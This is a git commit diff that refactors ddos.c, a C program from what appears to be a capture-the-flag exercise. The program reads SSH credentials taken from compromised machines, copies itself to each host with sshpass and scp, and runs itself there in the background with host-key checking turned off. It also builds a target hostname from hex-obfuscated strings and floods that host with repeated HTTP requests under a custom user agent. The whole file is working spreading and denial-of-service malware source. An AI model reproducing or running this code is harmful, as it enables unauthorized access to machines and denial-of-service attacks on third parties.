b58a491b46e4af8258a66e5b100a5dbaddc653d3
QuaeroEtTego <sacrejustin@gmail.com>
2023-11-08 18:53:23 +0100

    Optimization && while loop

--- ddos.c
+++ ddos.c
@@ -6,6 +6,9 @@
 #include <sys/types.h>
 #include <unistd.h>
 #include <curl/curl.h>
+#include <stdbool.h>
+
+typedef struct addrinfo addrinfo;
 
 //print menu
 void displayTextArt() {
@@ -28,24 +31,23 @@ void displayTextArt() {
 }
 
 long unsigned int special_secret_link() {
-	char link[64] = "https://rb.gy/o411hk";
+    const char link[] = "https://rb.gy/o411hk";
 	return strlen(link);
 }
 
 void transfer() {
-    
-    char client_file_name[64] = "ddos"; //path to the ddos file
+    char *client_file_name = "ddos"; //path to the ddos file
 
     //open file with ssh credentials from infected machine 
     FILE *file = fopen("credentials_test.csv", "r");
-    if (file == NULL) {
+    if (!file) {
         perror("Failed to open the info file");
         return;
     }
 
     char line[256];
     char processed_ips[256] = ""; // List of ip already used
-    int chmod_executed = 0;  // Flag for tracking chmod
+    bool chmod_executed = false;  // Flag for tracking chmod
 
     while (fgets(line, sizeof(line), file) != NULL) {
         char user[64];
@@ -69,18 +71,18 @@ void transfer() {
                 snprintf(scp_command, sizeof(scp_command), "sshpass -p %s scp -P %s %s %s@%s:/tmp/", password, port, client_file_name,user, ip);
                 printf("Created command : %s\n", scp_command); // print command created
                 system(scp_command);
-
             }
 
             // SSH connection to the user on the specified IP
             char ssh_command[256];
+
             if (chmod_executed) {
                 // If CHMOD executed, don't do chmod+x
                 snprintf(ssh_command, sizeof(ssh_command), "sshpass -p %s ssh -oStrictHostKeyChecking=no -p 22 -f %s@%s 'cd /tmp && nohup ./ddos > /dev/null 2>&1'", password, user, ip);
             } else {
                 // Execute ssh with chmod
                 snprintf(ssh_command, sizeof(ssh_command), "sshpass -p %s ssh -oStrictHostKeyChecking=no -p 22 -f %s@%s 'cd /tmp && chmod +x ddos && nohup ./ddos > /dev/null 2>&1'", password, user, ip);
-                chmod_executed = 1;
+                chmod_executed = true;
             }
 
             printf("Created command : %s\n", ssh_command); // show the current command
@@ -91,36 +93,40 @@ void transfer() {
     fclose(file);
 }
 
-void ddos(const char *hostname, int index, int total) {
+CURL *get_curl(const char *hostname) {
     CURL *curl = curl_easy_init();
+
+    if (!curl) {
+        exit(EXIT_FAILURE);
+    }
+
+    char url[28];
+    snprintf(url, 28,"http://%s", hostname);
+
+    curl_easy_setopt(curl, CURLOPT_URL, url);
+    curl_easy_setopt(curl, CURLOPT_PORT, 80);
+    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Russky rocket VP /poliakov 2.45"); //add custom user agent
+
+    return curl;
+}
+
+void ddos(CURL *curl) {
     CURLcode resolution;
 
-    if (curl) {
-        char url[256];
-        snprintf(url, sizeof(url), "http://%s", hostname);
+    freopen("/dev/null", "w", stdout); //don't show the get result
+    resolution = curl_easy_perform(curl);
+    freopen("/dev/tty", "w", stdout); // restablished the standard output
 
-        curl_easy_setopt(curl, CURLOPT_URL, url);
-        curl_easy_setopt(curl, CURLOPT_PORT, 80);
-        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Russky rocket VP /poliakov 2.45"); //add custom user agent
-
-        freopen("/dev/null", "w", stdout); //don't show the get result
-        resolution = curl_easy_perform(curl);
-        freopen("/dev/tty", "w", stdout); // restablished the standard output
-
-        if (resolution != CURLE_OK) {
-            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(resolution));
-        }
-        else {
-            printf("DDoS attack on %s was successful.\n", hostname);
-        }
-
-        curl_easy_cleanup(curl);
+    if (resolution != CURLE_OK) {
+        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(resolution));
+    } else {
+        fputs("DDoS attack was successful.\n", stdout);
     }
-    printf("[%d/%d] Progress: %d%%\r", index, total, (index * 100) / total);
+
     fflush(stdout);
 }
 
-char* the_0bfusk1_666_h0sTn4m3() {
+void the_0bfusk1_666_h0sTn4m3(char *str) {
     char nbmpdibqer[] = "\x6C\x6D";
     char msdopzoinf[] = "\x6E\x61";
     char odbazmapwn[] = "\x2E\x63\x74\x66";
@@ -129,57 +135,42 @@ char* the_0bfusk1_666_h0sTn4m3() {
     char foazuibcvi[] = "\x6C\x6C\x75\x78";
     char yzebxcpsuz[] = "\x61\x64";
     char nciuazbcvo[] = "\x68\x61";
-    
-    char combined[64];
-    
-    if (combined) {
-	    strcpy(combined, fjdoznvpzq);
-	    strcat(combined, msdopzoinf);
-	    strcat(combined, foazuibcvi);
-	    strcat(combined, nciuazbcvo);
-	    strcat(combined, nbmpdibqer);
-	    strcat(combined, vaedcvegvd);
-	    strcat(combined, yzebxcpsuz);
-	    strcat(combined, odbazmapwn);
-    }
-    
-    return strdup(combined);
+
+    snprintf(str, 21,"%s%s%s%s%s%s%s%s",
+            fjdoznvpzq,
+            msdopzoinf,
+            foazuibcvi,
+            nciuazbcvo,
+            nbmpdibqer,
+            vaedcvegvd,
+            yzebxcpsuz,
+            odbazmapwn);
+}
+
+bool check(char *hostname, addrinfo *hints, addrinfo *result) {
+    return getaddrinfo(hostname, NULL, hints, &result) == 0;
 }
 
 int main(void) {
+    displayTextArt();
 
     transfer();
-    struct addrinfo hints;
-    struct addrinfo *result;
-    char combined[64];
 
-    char* hostname = the_0bfusk1_666_h0sTn4m3(); //ip to ddos
-    
-    printf("Hostname : %s", hostname);
-
-    displayTextArt();
+    addrinfo hints, result;
 
     memset(&hints, 0, sizeof(hints));
     hints.ai_family = AF_UNSPEC;
     hints.ai_socktype = SOCK_STREAM;
 
-    int exists = getaddrinfo(hostname, NULL, &hints, &result);
+    char hostname[21];
+    the_0bfusk1_666_h0sTn4m3(hostname); //ip to ddos
 
-    if (exists == 0) {
-        printf("DNS exists.\n");
-        freeaddrinfo(result);
+    fprintf(stdout, "Hostname : %s\n", hostname);
 
-        int Calls = 10000;
-        for (int i = 1; i <= Calls; i++) {
-            ddos(hostname, i, Calls);
-        }
+    CURL *curl = get_curl(hostname);
 
-    } 
-    
-    else {
-        printf("DNS doesn't exist or may have a problem\n");
-    }
-    
-    free(hostname);
+    while (!check(hostname, &hints, &result))
+        ddos(curl);
 
+    curl_easy_cleanup(curl);
 }
